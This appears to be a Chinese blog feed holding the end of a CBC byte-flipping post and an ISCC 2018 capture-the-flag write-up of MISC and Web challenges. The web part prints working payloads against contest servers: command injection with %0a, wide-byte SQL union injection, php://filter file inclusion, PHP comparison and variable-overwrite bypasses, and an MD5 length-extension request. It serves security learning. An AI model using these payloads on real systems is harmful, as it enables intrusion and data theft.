1依旧为<code>a:2:{s:8:&quot;userna</code><br>故此得到第二个公式：（plain为无法反序列化打印出来的被base64编码的明文）</p><pre><code>want = &#39;a:2:{s:8:&quot;userna&#39;first_16 = &#39;&#39;iv = base64.b64decode(&#39;你一开始随机生成的被base64编码过的iv&#39;)for i in range(16):    first_16 += chr(ord(plain[i]) ^ ord(iv[i]) ^ ord(want[i]))newiv = first_16</code></pre><p>这样就可以将密文前16位的值，即block 1的明文变成我们想要的<code>a:2:{s:8:&quot;userna</code><br>故此即plain伪造成功，此时的plain是绝对可以被反序列化的<br>最后，我们将伪造的密文和伪造的iv传入cookie，即可被解密还原成我们伪造的plain<br>即：<br><code>a:2:{s:8:&quot;username&quot;;s:5:&quot;1dmin&quot;;s:8:&quot;password&quot;;s:5:&quot;Mang0&quot;;}</code><br>变成了<br><code>a:2:{s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:5:&quot;Mang0&quot;;}</code><br>最后即可以admin的身份成功登入网站，拿到flag</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CBC字节翻转攻击&quot;&gt;&lt;a href=&quot;#CBC字节翻转攻击&quot; class=&quot;headerlink&quot; title=&quot;CBC字节翻转攻击&quot;&gt;&lt;/a&gt;CBC字节翻转攻击&lt;/h1&gt;&lt;h2 id=&quot;CBC原理&quot;&gt;&lt;a href=&quot;#CBC原理&quot; class=&quot;header
      
    
    </summary>
    
      <category term="Web安全" scheme="http://0xmj.club/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="密码学" scheme="http://0xmj.club/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>ISCC2018-writeup</title>
    <link href="http://0xmj.club/2018/05/28/ISCC2018-writeup/"/>
    <id>http://0xmj.club/2018/05/28/ISCC2018-writeup/</id>
    <published>2018-05-27T16:54:05.000Z</published>
    <updated>2018-06-15T16:55:48.560Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="What-is-that？"><a href="#What-is-that？" class="headerlink" title="What is that？"></a>What is that？</h3><p>winhex打开修改高度</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805011954_574.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805011955_458.png" alt=""></p><p>_Welcome_To_ISCC<em>2018</em></p><h3 id="数字密文"><a href="#数字密文" class="headerlink" title="数字密文"></a>数字密文</h3><p>69742773206561737921 </p><p>16进制转文本 </p><p>给个在线网站</p><p><a href="https://www.bejson.com/convert/ox2str/" target="_blank" rel="external">https://www.bejson.com/convert/ox2str/</a></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171116_151.png" alt=""></p><h3 id="秘密电报："><a href="#秘密电报：" class="headerlink" title="秘密电报："></a>秘密电报：</h3><p>知识就是力量 ABAAAABABBABAAAABABAAABAAABAAABAABAAAABAAAABA</p><p>在线培根密码解密</p><p><a href="http://tool.ph0en1x.com/bacon/" target="_blank" rel="external">http://tool.ph0en1x.com/bacon/</a></p><p>ILIKEISCC</p><h3 id="重重谍影"><a href="#重重谍影" class="headerlink" title="重重谍影"></a>重重谍影</h3><p>base64解密，</p><p>在线解密<a href="https://base64.supfree.net/" target="_blank" rel="external">https://base64.supfree.net/</a></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171406_511.png" alt=""></p><p>解密到这里不行了</p><p>U2FsdGVkX183BPnBd50ynIRM3o8YLmwHaoi8b8QvfVdFHCEwG9iwp4hJHznrl7d4B5rKClEyYVtx6uZFIKtCXo71fR9Mcf6b0EzejhZ4pnhnJOl+zrZVlV0T9NUA+u1ziN+jkpb6ERH86j7t45v4Mpe+j1gCpvaQgoKC0Oaa5kc=  </p><p>然后再用aes解密 </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171412_741.png" alt=""></p><p><a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="external">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171413_518.png" alt=""></p><p>把我复制走</p><h3 id="有趣的ISCC"><a href="#有趣的ISCC" class="headerlink" title="有趣的ISCC"></a>有趣的ISCC</h3><p>把图片放进WinHex中观察 </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171511_899.png" alt=""></p><p>末尾有很多Unicode</p><p>Unicode转ascii</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171423_933.png" alt=""></p><p>unicode转中文</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171425_238.png" alt=""></p><p>flag{iscc is fun}</p><h3 id="Where-is-the-FLAG？"><a href="#Where-is-the-FLAG？" class="headerlink" title="Where is the FLAG？"></a>Where is the FLAG？</h3><p>TweakPNG打开 </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171430_847.png" alt=""></p><p>Adobe Fireworks CS5 处理 </p><p>图层隐层</p><p>拼接一下</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171502_356.png" alt=""></p><h3 id="凯撒十三世"><a href="#凯撒十三世" class="headerlink" title="凯撒十三世"></a>凯撒十三世</h3><p>凯撒密码，并且偏移是13</p><p>得到<code>roqtp697t95j3</code>，一看就不是flag，结合提示<code>键盘</code>，所以可能是键盘密码: 即密文在键盘上的下一行所对应的字符是相应明文，</p><h3 id="一只猫的心思"><a href="#一只猫的心思" class="headerlink" title="一只猫的心思"></a>一只猫的心思</h3><p>winhex打开会发现这个是jpg文件，有文件头，但是没有文件尾，搜索之后就会得到文件尾FFD9所在的位置，需要把FFD9后面的十六进制转化为一个新的文件，并且要以（.doc）格式保存  </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171528_660.png" alt=""></p><p><a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="external">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a> </p><p>佛曰密码解</p><p>523156615245644E536C564856544E565130354B553064524D6C524E546B4A56535655795645644F5530524857544A4553553943566B644A4D6C524E546C7052523155795645744F536C5248515670555330354452456456576B524854554A585231457956554E4F51305A4855544E4553303153566B64424D6C524A546B7058527A525A5245744F576C5A4854544A5554553554513063304E46524C54564A5652316B795255744F51305A4856544E5554564661566B6C464D6B5252546B70595231557A5245394E516C5A4856544A555355354B566B644E5756524E5455705752316B7A5255564F55305248566B465553564A4356306C4E4D6C524E546B4A565231557952453152556C564A56544A455555354B5530644E5756525054554A56523030795645314F516C5A4857544A4553303143566B64464D305648546B744352314A425645744F576C5A4855544A4651303543566B64564D6B524854554A555230557A52454E4F536C644855544A5554553543566B645A4D6B564A546C4E445231566152456C52576C5A4855544A5553303544516B64564D6C524C54564A55523045795245314F556C4A4856544E455355354B56556C564D6B564E546B70535230315A52457452536C564951544A555455354B565564535156524A54564A575230457956456C4E576C46485454525553303143566B6446576C564A54544A46</p><p>十六进制转换了，转换为字符串：  </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171532_778.png" alt=""></p><p>base64解密：  </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171557_687.png" alt=""></p><p>base32：  </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171615_371.png" alt=""></p><p>十六进制转化： </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171616_86.png" alt=""></p><p>base64解密：  </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171617_526.png" alt=""></p><p>base32：  </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171618_95.png" alt=""></p><p>十六进制转化 </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171619_254.png" alt=""></p><p>F1a9_is_I5cc_ZOl8_G3TP01NT</p><p>Base64编码是使用64个可打印ASCII字符（A-Z、a-z、0-9、+、/）将任意字节序列数据编码成ASCII字符串，另有“=”符号用作后缀用途</p><p>Base32编码是使用32个可打印字符（字母A-Z和数字2-7） </p><p>Base16编码使用16个ASCII可打印字符（数字0-9和字母A-F）对任意字节数据进行编码 </p><h3 id="暴力XX不可取"><a href="#暴力XX不可取" class="headerlink" title="暴力XX不可取"></a>暴力XX不可取</h3><p>伪加密修改的几种方法</p><blockquote><p>1、在Mac OS以及部分linux（Kali）系统中，可以直接打开伪加密的ZIP压缩包。</p><p>2、使用检测伪加密的工具ZipCenOp.jar，解密后如果能成功打开ZIP包，则是伪加密，否则说明思路错误。</p><p>3、使用16进制编辑器更改加密标志位。</p></blockquote><p>打开压缩包之后发现需要解压密码</p><p>既然已经知道是伪加密那就直接尝试伪加密，利用伪加密判断工具ZipCenOp</p><pre><code>java -jar ZipCenOp.jar r ISCC-MISC02.zip</code></pre><p>vfppjrnerpbzvat </p><p>rot13 解码</p><p>得到isccwearecoming</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805012218_803.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805012227_276.png" alt=""></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="比较数字大小"><a href="#比较数字大小" class="headerlink" title="比较数字大小"></a>比较数字大小</h3><p>f12查看 本地长度绕过修改maxlength=4</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805031858_254.png" alt=""></p><p>输入99999999提交</p><p>得key is 768HKyu678567&amp;*&amp;K</p><h3 id="web01"><a href="#web01" class="headerlink" title="web01"></a>web01</h3><p><img src="http://oy0tigw51.bkt.clouddn.com/201805071904_900.png" alt=""></p><pre><code>&lt;?php highlight_file(&#39;2.php&#39;); $flag=&#39;{***************}&#39;; if (isset($_GET[&#39;password&#39;])) {       if (strcmp($_GET[&#39;password&#39;], $flag) == 0)   ////如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。 //比较两个字符串（区分大小写）         die(&#39;Flag: &#39;.$flag);       else           print &#39;Invalid password&#39;;   }   ?&gt;</code></pre><p><a href="http://118.190.152.202:8003?password[]=1" target="_blank" rel="external">http://118.190.152.202:8003?password[]=1</a></p><p>ISCC{iscc_ef3w5r5tw_5rg5y6s3t3} </p><h3 id="本地的诱惑"><a href="#本地的诱惑" class="headerlink" title="本地的诱惑"></a>本地的诱惑</h3><p>查看源码ISCC{^&amp;*(UIHKJjkadshf}</p><h3 id="你能跨过去吗？"><a href="#你能跨过去吗？" class="headerlink" title="你能跨过去吗？"></a>你能跨过去吗？</h3><p>题目</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805031853_626.png" alt=""></p><p>%2b/v%2b%20%2bADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA%2bAC0-&amp;_</p><p>base64解码</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805031853_539.png" alt=""></p><p>flag{Hell0World}</p><h3 id="一切都是套路"><a href="#一切都是套路" class="headerlink" title="一切都是套路"></a>一切都是套路</h3><p>好像有个文件忘记删了</p><p>考察源码泄露</p><p>py脚本得到<a href="http://118.190.152.202:8009/index.php.txt" target="_blank" rel="external">http://118.190.152.202:8009/index.php.txt</a></p><p>所以进入得到如下代码</p><pre><code class="php">&lt;?phpinclude &quot;flag.php&quot;;if ($_SERVER[&quot;REQUEST_METHOD&quot;] != &quot;POST&quot;)    die(&quot;flag is here&quot;);if (!isset($_POST[&quot;flag&quot;])     die($_403);foreach ($_GET as $k =&gt; $v){     $$k = $$v;//$k=200 $$k=$_200    所以$_200 = &amp;flag}foreach ($_POST as $k =&gt; $v){    $$k = $v; //$flag =2333}if ( $_POST[&quot;flag&quot;] !== $flag )    die($_403);echo &quot;flag: &quot;. $flag . &quot;\n&quot;;die($_200);?&gt;</code></pre><blockquote><h5 id="foreach"><a href="#foreach" class="headerlink" title="foreach"></a>foreach</h5><p>(PHP 4, PHP 5, PHP 7)</p><p><em>foreach</em> 语法结构提供了遍历数组的简单方式。<em>foreach</em> 仅能够应用于数组和对象，如果尝试应用于其他数据类型的变量，或者未初始化的变量将发出错误信息。有两种语法：</p><pre><code>foreach (array_expression as $value)    statementforeach (array_expression as $key =&gt; $value)    statement</code></pre><p>第一种格式遍历给定的 <em>array_expression</em> 数组。每次循环中，当前单元的值被赋给 <em>$value</em> 并且数组内部的指针向前移一步（因此下一次循环中将会得到下一个单元）。</p><p>第二种格式做同样的事，只除了当前单元的键名也会在每次循环中被赋给变量 <em>$key</em>。</p></blockquote><p><a href="http://www.cleey.com/blog/single/id/841.html" target="_blank" rel="external">深入解析php中的foreach问题</a></p><p>题目中使用了两个foreach并且也使用了’&amp;&amp;’,两个foreach中对 $$key的处理是不一样的，满足条件后会将$flag里面的值打印出来，所以$flag是在flag.php文件文件中的。 行间的代码会将$flag的值给覆盖掉了，所以需要先将$flag的值赋给$_200或$_403变量，然后利用die($_200)或 die($_403)将flag打印出来。</p><p>有很明显的变量覆盖漏洞。要求我们在post语句中有flag，同时在第二个foreach中又把<code>$flag</code>直接覆盖了，所以直接通过echo语句输出的flag是被修改过的。接着看看有什么输出点，比如有个<code>die($_200)</code>，结合第一个foreach的功能，我们可以在第二个foreach之前先将<code>$_200</code>的值覆盖为原flag的值。</p><p>payload:</p><pre><code>index.php?_200=flagPOST:flag=1</code></pre><p>利用前面的<code>die($_403)</code>也可以实现。我们先把原flag的值覆盖到<code>$_403</code>上，然后构造<code>$_POST[&quot;flag&quot;] !== $flag</code>，从而<code>die($_403)</code>输出flag。</p><p>payload2:</p><pre><code>index.php?_403=flag&amp;_POST=1POST:flag=</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201805070015_872.png" alt=""></p><p>ISCC{taolu2333333….} </p><h3 id="你能绕过吗"><a href="#你能绕过吗" class="headerlink" title="你能绕过吗?"></a>你能绕过吗?</h3><p>打开地址随便点文章，一开始可能以为是sql注入</p><p>但仔细看会发现?f=articles可能是存在文件包含漏洞</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805071843_315.png" alt=""></p><p>但是这里有个坑，题目说</p><blockquote><p>你能绕过吗?</p><p>没过滤好啊</p></blockquote><p>因为考察文件包含漏洞所以很有可能过滤php filter协议，尝试大写Php发现绕过成功</p><p><a href="http://118.190.152.202:8008/index.php?f=Php://filter/read=convert.base64-encode/resource=index&amp;id=2" target="_blank" rel="external">http://118.190.152.202:8008/index.php?f=Php://filter/read=convert.base64-encode/resource=index&amp;id=2</a></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805071842_517.png" alt=""></p><p>得到base64源码。</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805071842_242.png" alt=""></p><p>ISCC{LFIOOOOOOOOOOOOOO}</p><h3 id="web02"><a href="#web02" class="headerlink" title="web02"></a>web02</h3><p><a href="http://118.190.152.202:8004/" target="_blank" rel="external">http://118.190.152.202:8004/</a></p><p>一开始尝试X-Forwarded-For: 127.0.0.1不行</p><blockquote><pre><code>X-Forwarded-For: 127.0.0.1Contact: 127.0.0.1X-Originating-IP: 127.0.0.1X-Real-IP: 127.0.0.1X-Client-IP: 127.0.0.1Referer: 127.0.0.1From: 127.0.0.1X-Wap-Profile: 127.0.0.1True-Client-IP: 127.0.0.1Client-IP: 127.0.0.1</code></pre></blockquote><p>后来尝试Client-IP: 127.0.0.1</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805021340_915.png" alt=""></p><p>ISCC{iscc_059eeb8c0c33eb62}</p><h3 id="请ping我的ip-看你能Ping通吗？"><a href="#请ping我的ip-看你能Ping通吗？" class="headerlink" title="请ping我的ip 看你能Ping通吗？"></a>请ping我的ip 看你能Ping通吗？</h3><p>万万没想到直接在get方式下命令执行，过滤| 使用%0a绕过</p><p>查看当前目录<a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0als" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0als</a></p><p>查看源代码<a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acat%20index.php" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acat%20index.php</a></p><pre><code> &#39;&#39;,        &#39;;&#39; =&gt; &#39;&#39;,        &#39;|&#39; =&gt; &#39;&#39;,        &#39;-&#39;  =&gt; &#39;&#39;,        &#39;$&#39;  =&gt; &#39;&#39;,        &#39;(&#39;  =&gt; &#39;&#39;,        &#39;)&#39;  =&gt; &#39;&#39;,        &#39;`&#39;  =&gt; &#39;&#39;,        &#39;||&#39; =&gt; &#39;&#39;,    );    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {        // Windows        $cmd = shell_exec( &#39;ping  &#39; . $target );    }    else {        // *nix        $cmd = shell_exec( &#39;ping  -c 1 &#39; . $target );    }    echo  &quot;{$cmd}&quot;;?&gt;</code></pre><p>查看根目录<a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0als" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0als</a></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805080036_137.png" alt=""></p><p>一个一个试查看flag在哪里 发现flag在/home/flag</p><p><a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0acd%20home%0als" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0acd%20home%0als</a></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805080045_61.png" alt=""></p><p><a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0acd%20home%0acat%20flag" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0acd%20home%0acat%20flag</a></p><pre><code>ISCC{8a8646c7a2fce16b166fbc68ca65f9e4}</code></pre><p>Reference：</p><p><a href="http://vinc.top/2016/12/22/%E3%80%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E3%80%91%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/" target="_blank" rel="external">http://vinc.top/2016/12/22/%E3%80%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E3%80%91%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/</a></p><p>方法二:</p><p> 使用扫描器，扫描一下目录。如下图所示； <img src="http://www.360zhijia.com/wp-content/uploads/2018/05/25/834add0a-fcb1-4893-bd20-de7ff3e922d4.png" alt="第一手详细又全面的ISCC 2018 writeup等你学习"> 扫描结果：<a href="http://118.190.152.202:8018/flag.txt" target="_blank" rel="external">http://118.190.152.202:8018/flag.txt</a> （3） 打开扫描结果，如下图所示； <img src="http://www.360zhijia.com/wp-content/uploads/2018/05/25/afd1056b-c0f7-4735-aff0-2cf288df693f.png" alt="第一手详细又全面的ISCC 2018 writeup等你学习"> </p><h3 id="php是世界上最好的语言"><a href="#php是世界上最好的语言" class="headerlink" title="php是世界上最好的语言"></a>php是世界上最好的语言</h3><p><img src="http://oy0tigw51.bkt.clouddn.com/201805170015_39.png" alt=""></p><pre><code class="php">&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); if(isset($_POST[&#39;username&#39;])&amp;isset($_POST[&#39;password&#39;])){     $username = $_POST[&#39;username&#39;];     $password = $_POST[&#39;password&#39;]; } else{     $username=&quot;hello&quot;;     $password=&quot;hello&quot;; } if(md5($password) == 0){     echo &quot;xxxxx&quot;; } show_source(__FILE__); ?&gt;</code></pre><p>md5</p><p>password=240610708</p><p>跳转</p><pre><code class="php">&lt;?php include &#39;flag.php&#39;; $a = @$_REQUEST[&#39;a&#39;]; @eval(&quot;var_dump($$a);&quot;); show_source(__FILE__); ?&gt;</code></pre><p>$$a 这个东西很诡异。其实就是php中变量可以当作另一个变量的变量名 </p><p><strong>$GLOBALS</strong> — 引用全局作用域中可用的全部变量</p><p>$GLOBALS 这种全局变量用于在 PHP 脚本中的任意位置访问全局变量（从函数或方法中均可）。</p><p>PHP 在名为 $GLOBALS[index] 的数组中存储了所有全局变量。变量的名字就是数组的键。</p><p>这里介绍一个php中的特殊变量: <code>$GLOBALS</code>，它的作用如下： </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805170011_680.png" alt=""></p><p> 所以我们可以利用<code>$GLOBALS</code>输出flag的值，故payload： </p><p><a href="http://118.190.152.202:8005/no_md5.php?a=GLOBALS" target="_blank" rel="external">http://118.190.152.202:8005/no_md5.php?a=GLOBALS</a></p><p>ISCC{a39f9a1ff7eb4bab8a6a21b2ce111b4} </p><h3 id="Please-give-me-username-and-password"><a href="#Please-give-me-username-and-password" class="headerlink" title="Please give me username and password!"></a>Please give me username and password!</h3><p>在url传参username和password得到界面提示有index.php.txt文件</p><p>所以访问<a href="http://118.190.152.202:8017/index.php.txt" target="_blank" rel="external">http://118.190.152.202:8017/index.php.txt</a></p><p>得到源码</p><pre><code>&lt;?phperror_reporting(0);$flag = &quot;***********&quot;;    if(isset($_GET[&#39;username&#39;])){    if (0 == strcasecmp($flag,$_GET[&#39;username&#39;])){    $a = fla;    echo &quot;very good!Username is right&quot;;    }    else{    print &#39;Username is not right&lt;!--index.php.txt--&gt;&#39;;}}elseprint &#39;Please give me username or password!&#39;;if (isset($_GET[&#39;password&#39;])){    if (is_numeric($_GET[&#39;password&#39;])){        if (strlen($_GET[&#39;password&#39;]) &lt; 4){            if ($_GET[&#39;password&#39;] &gt; 999){            $b = g;            print &#39;&lt;p&gt;very good!Password is right&lt;/p&gt;&#39;;        }else             print &#39;&lt;p&gt;Password too little&lt;/p&gt;&#39;;        }else        print &#39;&lt;p&gt;Password too long&lt;/p&gt;&#39;;    }else    print &#39;&lt;p&gt;Password is not numeric&lt;/p&gt;&#39;;}if ($a.$b == &quot;flag&quot;)    print $flag;?&gt;</code></pre><p>分析</p><pre><code>if(isset($_GET[&#39;username&#39;])){    if (0 == strcasecmp($flag,$_GET[&#39;username&#39;])){    $a = fla;    echo &quot;very good!Username is right&quot;;</code></pre><blockquote><p>strcasecmp(string1,string2)</p><p> 参数 str1第一个字符串。str2第二个字符串。</p><p>如果 str1 小于 str2 返回 &lt; 0；</p><p> 如果 str1 大于 str2 返回 &gt; 0；</p><p>如果两者相等，返回 0。 </p></blockquote><p>可以使用username数组绕过</p><pre><code>if (is_numeric($_GET[&#39;password&#39;])){        if (strlen($_GET[&#39;password&#39;]) &lt; 4){            if ($_GET[&#39;password&#39;] &gt; 999){            $b = g;</code></pre><p>必须通过3位数字，但大于999</p><p><a href="http://52.10.107.64:8002/?password=4e3" target="_blank" rel="external">?password=4e3</a> </p><p><a href="http://118.190.152.202:8017/index.php?username[]=1&amp;password=4e3" target="_blank" rel="external">http://118.190.152.202:8017/index.php?username[]=1&amp;password=4e3</a> </p><p>flag{ISCC2018_Very_GOOD!} </p><p>Reference：</p><p><a href="https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="external">https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p><p><a href="https://github.com/bl4de/ctf/blob/master/2015/BostonKeyPartyCTF_2015/Symphony.md" target="_blank" rel="external">https://github.com/bl4de/ctf/blob/master/2015/BostonKeyPartyCTF_2015/Symphony.md</a></p><h3 id="SQL注入的艺术"><a href="#SQL注入的艺术" class="headerlink" title="SQL注入的艺术"></a>SQL注入的艺术</h3><p>注入点:个人信息栏</p><p>发现页面编码是gb2312，可能是宽字节注入，检验一下<code>id=1%df&#39;--+</code>，返回正常页面，确定是宽字节注入 </p><pre><code>id=1%df&#39; or 1=1  order by 8--+  id=1%df&#39; or 1=1  order by 9--+id=-1%df&#39; union select 1,2,3,4,5,6,7,8--+    id=-1%df&#39; union select 1,database(),3,user(),5,6,group_concat(table_name),8 from information_schema.tables where table_schema = database() --+  id=-1%df&#39; union select 1,database(),3,user(),5,6,group_concat(column_name),8 from information_schema.columns where table_name = 0x61646d696e73 --+ id=-1%df&#39; union select 1,database(),3,user(),5,6,group_concat(flag),8 from admins --+</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201805080049_453.png" alt=""></p><p> Flag：Y0u_@<a href="https://github.com/33w_dxxmn_9rf0Od" target="_blank" rel="external">@33w_dxxmn_9rf0Od</a> </p><h3 id="试试看"><a href="#试试看" class="headerlink" title="试试看"></a>试试看</h3><p><a href="http://118.190.152.202:8006/show.php?img=php://filter/read=convert.base64-encode/resource=jpg/resource=show.php" target="_blank" rel="external">http://118.190.152.202:8006/show.php?img=php://filter/read=convert.base64-encode/resource=jpg/resource=show.php</a></p><p>打开题目</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805140857_654.png" alt=""></p><p>查看源码<img src="http://oy0tigw51.bkt.clouddn.com/201805140858_867.png" alt=""></p><p>知道这里调用show.php?img=1.jpg  访问 并修改1的值</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805140901_199.png" alt=""></p><p>大概可以猜测 文件包含漏洞，尝试</p><pre><code class="php">img=php://filter/read=convert.base64-encode/resource=show.php</code></pre><p>但是不行</p><p>题目的坑点在于还需要包含jpg，这就是贪婪包含所在，也就是后台某处代码所致，</p><p>curl <a href="http://118.190.152.202:8006/show.php?img=php://filter/resource=jpg/resource=show.php" target="_blank" rel="external">http://118.190.152.202:8006/show.php?img=php://filter/resource=jpg/resource=show.php</a></p><pre><code class="php">&lt;?phperror_reporting(0);ini_set(&#39;display_errors&#39;,&#39;Off&#39;);include(&#39;config.php&#39;);$img = $_GET[&#39;img&#39;];if(isset($img) &amp;&amp; !empty($img)){    if(strpos($img,&#39;jpg&#39;) !== false)    {        if(strpos($img,&#39;resource=&#39;) !== false &amp;&amp; preg_match(&#39;/resource=.*jpg/i&#39;,$img) === 0)        {            die(&#39;File not found.&#39;);        }        preg_match(&#39;/^php:\/\/filter.*resource=([^|]*)/i&#39;,trim($img),$matches);        if(isset($matches[1]))        {            $img = $matches[1];        }        header(&#39;Content-Type: image/jpeg&#39;);        $data = get_contents($img);        echo $data;    }    else    {        die(&#39;File not found.&#39;);    }}else{    ?&gt;    &lt;img src=&quot;1.jpg&quot;&gt;    &lt;?php}?&gt;</code></pre><ol><li>开头包含了config.php</li><li>img必须有jpg但又不能有resource=.*jpg</li><li>正则检查了并把结果填充到$matches 里去，说明我们可以使用php://filter伪协议，并且resource的值不含|，那么我们就可以用| 来分隔php 和jpg，因为正则匹配到| 就不会继续匹配后面的jpg 了，使得\$img=show.php</li></ol><p>知道了config.php再去访问明白为什么必须包含jpg</p><pre><code class="php">&lt;?phpfunction get_contents($img){        if(strpos($img,&#39;jpg&#39;) !== false)        {                return file_get_contents($img);        }        else        {                header(&#39;Content-Type: text/html&#39;);                return file_get_contents($img);        }}?&gt;</code></pre><p>最终payload:</p><p><a href="http://118.190.152.202:8006/show.php?img=php://filter/resource=../flag.php|jpg" target="_blank" rel="external">http://118.190.152.202:8006/show.php?img=php://filter/resource=../flag.php|jpg</a></p><!-- flag{1ntere5ting_PHP_Regu1ar_express1onssssss} --><h3 id="Collide"><a href="#Collide" class="headerlink" title="Collide"></a>Collide</h3><pre><code>&lt;?phpinclude &quot;secret.php&quot;;@$username=(string)$_POST[&#39;username&#39;];function enc($text){    global $key;    return md5($key.$text);}if(enc($username) === $_COOKIE[&#39;verify&#39;]){    if(is_numeric(strpos($username, &quot;admin&quot;))){        die($flag);    }    else{        die(&quot;you are not admin&quot;);    }}else{    setcookie(&quot;verify&quot;, enc(&quot;guest&quot;), time()+60*60*24*7);    setcookie(&quot;len&quot;, strlen($key), time()+60*60*24*7);}show_source(__FILE__);</code></pre><ol><li>一个不知道的$key，但是从cookie中可以知道它的长度是46</li><li>从cookie中知道md5(\$key.guest) 的值，也就是知道enc(\$username) 符合条件的值</li><li>获得flag 的条件，满足enc(\$username) == md5(\$key.guest)，同时\$username 要含有admin</li></ol><p>使用HashPump攻击； </p><p>安装HashPump；</p><p> 方法一： git clone <a href="https://github.com/bwall/HashPump.git" target="_blank" rel="external">https://github.com/bwall/HashPump.git</a> apt-get install g++ libssl-dev cd HashPump make make install B.方法二： pip install hashpumpy </p><p>方法二:</p><p>pip install hashpumpy </p><pre><code>$ hashpump -s &#39;78cfc57d983b4a17e55828c001a3e781&#39; -d &#39;guest&#39; -a &#39;admin&#39; -k 465f585093a7fe86971766c3d25c43d0ebguest\x80\x00\x00\x00\x00\x98\x01\x00\x00\x00\x00\x00\x00admin</code></pre><p>POST / HTTP/1.1<br>Host: 118.190.152.202:8002<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<br>Cookie: verify=5f585093a7fe86971766c3d25c43d0eb; len=46<br>Connection: close<br>Upgrade-Insecure-Requests: 1<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 58</p><p>username=guest%80%00%00%00%00%98%01%00%00%00%00%00%00admin</p><p>ISCC{MD5_1s_n0t_5afe}</p><p><a href="http://p0sec.net/index.php/archives/99/" target="_blank" rel="external">http://p0sec.net/index.php/archives/99/</a></p><p><a 